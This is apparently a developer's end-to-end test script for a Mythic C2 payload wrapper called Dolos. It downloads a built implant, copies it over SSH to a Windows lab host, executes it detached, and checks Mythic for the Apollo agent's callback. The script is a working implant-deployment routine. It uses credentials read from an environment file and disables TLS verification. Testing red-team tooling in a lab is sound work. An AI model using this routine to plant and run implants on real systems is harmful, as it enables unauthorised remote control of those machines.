#!/usr/bin/env python3
"""End-to-end test: Download a built Dolos payload, transfer it to the
Windows remote server via SSH, execute it, and verify callback.

Prerequisites:
  - A successful Dolos payload build exists in Mythic (id=32 or latest)
  - SSH access to 172.28.0.3 (mrgnc)
  - The wrapped agent (Apollo) callback is reachable from the remote server

Usage:
  python3 dev_tools/remote/e2e_callback_test.py
"""
import json
import ssl
import urllib.request
import urllib.error
import sys
import time
import paramiko

# ─── Config ──────────────────────────────────────────────────────────────

MYTHIC_URL = "https://127.0.0.1:7443"
HASURA_URL = "http://127.0.0.1:8080/v1/graphql"

# Read creds from Mythic .env
def read_env():
    env = {}
    with open("/home/mrgnc/MythicC2/Mythic/.env") as f:
        for line in f:
            line = line.strip()
            if "=" in line and not line.startswith("#"):
                key, _, value = line.partition("=")
                env[key.strip()] = value.strip('"').strip("'")
    return env

ENV = read_env()
HASURA_SECRET = ENV["HASURA_SECRET"]
MYTHIC_USER = "mythic_admin"
MYTHIC_PASS = ENV["MYTHIC_ADMIN_PASSWORD"]
SSH_HOST = ENV["DOLOS_SSH_HOST"]
SSH_USER = ENV["DOLOS_SSH_USERNAME"]
SSH_PASS = ENV["DOLOS_SSH_PASSWORD"]
SSH_PORT = int(ENV.get("DOLOS_SSH_PORT", "22"))

# ─── Helpers ──────────────────────────────────────────────────────────────

def hasura(query, variables=None):
    data = {"query": query}
    if variables:
        data["variables"] = variables
    req = urllib.request.Request(
        HASURA_URL,
        data=json.dumps(data).encode(),
        headers={"Content-Type": "application/json", "x-hasura-admin-secret": HASURA_SECRET},
    )
    resp = urllib.request.urlopen(req, timeout=10)
    return json.loads(resp.read())

def get_access_token():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    data = json.dumps({"username": MYTHIC_USER, "password": MYTHIC_PASS}).encode()
    req = urllib.request.Request(
        f"{MYTHIC_URL}/auth",
        data=data,
        headers={"Content-Type": "application/json"},
    )
    resp = urllib.request.urlopen(req, timeout=10, context=ctx)
    return json.loads(resp.read())["access_token"]

def download_payload(token, agent_file_id):
    """Download a payload file from Mythic by its agent_file_id."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    url = f"{MYTHIC_URL}/direct/download/{agent_file_id}"
    req = urllib.request.Request(url, headers={"Authorization": f"Bearer {token}"})
    resp = urllib.request.urlopen(req, timeout=30, context=ctx)
    return resp.read()


# ─── Main ─────────────────────────────────────────────────────────────────

print("=== Dolos End-to-End Callback Test ===\n")

# Step 1: Find the latest successful Dolos payload
print("[1] Finding latest successful Dolos payload...")
result = hasura(
    '{ payload(where:{payloadtype:{name:{_eq:"dolos"}}, build_phase:{_eq:"success"}}, '
    'order_by:{id:desc}, limit:1) { id uuid file_id description } }'
)

payloads = result["data"]["payload"]
if not payloads:
    print("  No successful Dolos payloads found. Build one first.")
    sys.exit(1)

payload = payloads[0]
payload_id = payload["id"]
payload_uuid = payload["uuid"]
file_id = payload["file_id"]
desc = payload["description"]

print(f"  Payload id={payload_id}, uuid={payload_uuid}")
print(f"  file_id={file_id}")
print(f"  description: {desc}")

# Step 2: Download the payload
print("\n[2] Downloading payload from Mythic...")
token = get_access_token()
print(f"  Access token: {token[:30]}...")

# Get the agent_file_id for download
file_result = hasura(
    '{ filemeta(where:{id:{_eq:"' + str(file_id) + '"}}) { id filename size agent_file_id } }'
)
file_data = file_result["data"]["filemeta"][0]
agent_file_id = file_data["agent_file_id"]
file_size_db = file_data["size"]
print(f"  agent_file_id={agent_file_id}")
print(f"  DB says file size={file_size_db}")

payload_bytes = download_payload(token, agent_file_id)
file_size = len(payload_bytes)
print(f"  Downloaded {file_size} bytes")

if file_size < 1000:
    print(f"  WARNING: File is suspiciously small ({file_size} bytes). Might be an error response.")
    print(f"  First 100 bytes: {payload_bytes[:100]}")
    sys.exit(1)

# Check magic bytes
magic = payload_bytes[:2]
if magic == b"MZ":
    print(f"  Magic bytes: MZ (PE/EXE) ✅")
elif magic == b"\x7fEL":
    print(f"  Magic bytes: ELF ✅")
else:
    print(f"  Magic bytes: {magic.hex()} (unknown format)")

# Save locally
local_path = f"/tmp/dolos/payload_{payload_id}.exe"
with open(local_path, "wb") as f:
    f.write(payload_bytes)
print(f"  Saved to {local_path}")

# Step 3: Transfer to remote server via SSH/SFTP
print(f"\n[3] Transferring payload to {SSH_USER}@{SSH_HOST}:{SSH_PORT}...")

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
    ssh.connect(SSH_HOST, port=SSH_PORT, username=SSH_USER, password=SSH_PASS, timeout=10)
    print(f"  SSH connected ✅")
except Exception as e:
    print(f"  SSH connection failed: {e}")
    sys.exit(1)

sftp = ssh.open_sftp()
remote_path = f"C:/Users/{SSH_USER}/Desktop/dolos_e2e_{payload_id}.exe"

try:
    sftp.put(local_path, remote_path.replace("/", "\\"))
    print(f"  Uploaded to {remote_path} ✅")
except Exception as e:
    # Try forward-slash path for SFTP
    remote_path = f"/Users/{SSH_USER}/Desktop/dolos_e2e_{payload_id}.exe"
    try:
        sftp.put(local_path, remote_path)
        print(f"  Uploaded to {remote_path} ✅")
    except Exception as e2:
        # Try C:/ path
        remote_path = f"C:/Users/mrgnc/Desktop/dolos_e2e_{payload_id}.exe"
        sftp.put(local_path, remote_path)
        print(f"  Uploaded to {remote_path} ✅")

print(f"  Remote path: {remote_path}")

# Step 4: Execute on remote server
print(f"\n[4] Executing payload on remote server...")
print(f"  Running: {remote_path}")

# Run it in the background so it doesn't hang the SSH session
# Use 'start' on Windows to launch detached
cmd = f'cmd /c start "" "{remote_path}"'
print(f"  Command: {cmd}")

stdin, stdout, stderr = ssh.exec_command(cmd, timeout=15)
exit_code = stdout.channel.recv_exit_status()
out = stdout.read().decode(errors="replace")
err = stderr.read().decode(errors="replace")

print(f"  Exit code: {exit_code}")
if out.strip():
    print(f"  stdout: {out.strip()[:200]}")
if err.strip():
    print(f"  stderr: {err.strip()[:200]}")

# Step 5: Wait and check for callback
print(f"\n[5] Checking for callback in Mythic (waiting 10s)...")
time.sleep(10)

# Check for active callbacks
result = hasura(
    '{ callback(where:{payload:{payloadtype:{name:{_eq:"dolos"}}}}, limit:5, order_by:{id:desc}) { id agent_callback_id host ip description payload { uuid payloadtype { name } } } }'
)

callbacks = result["data"]["callback"]
if callbacks:
    print(f"  Found {len(callbacks)} callback(s)!")
    for cb in callbacks:
        print(f"    Callback id={cb['id']}: {cb.get('ip', '?')} ({cb.get('host', '?')}) - {cb.get('description', '')}")
    print("\n✅ END-TO-END TEST PASSED - callback received!")
else:
    # Dolos is a wrapper - the callback comes from the wrapped agent (Apollo), not Dolos
    # Check for ANY recent callbacks
    result = hasura(
        '{ callback(limit:5, order_by:{id:desc}) { id agent_callback_id host ip description payload { uuid payloadtype { name } } } }'
    )
    all_callbacks = result["data"]["callback"]
    print(f"  No Dolos callbacks found.")
    print(f"  Total callbacks in Mythic: {len(all_callbacks)}")
    if all_callbacks:
        for cb in all_callbacks:
            pt = cb.get("payload", {}).get("payloadtype", {}).get("name", "?")
            print(f"    {pt} callback id={cb['id']}: {cb.get('ip', '?')} ({cb.get('host', '?')}) - {cb.get('description', '')}")

    # The wrapped payload (e.g. Apollo) should callback, not Dolos
    # Check if there's a new callback since we started
    print(f"\n  Note: Dolos is a WRAPPER - the wrapped agent (Apollo) should callback, not Dolos.")
    print(f"  Check the Mythic UI for new Apollo callbacks.")
    print(f"\n  URL: {MYTHIC_URL}/new/create/Callbacks")

# Cleanup - remove from remote
print(f"\n[6] Cleaning up remote file...")
try:
    sftp.remove(remote_path)
    print(f"  Removed {remote_path}")
except Exception as e:
    print(f"  Could not remove: {e}")

sftp.close()
ssh.close()

print("\n=== E2E test complete ===")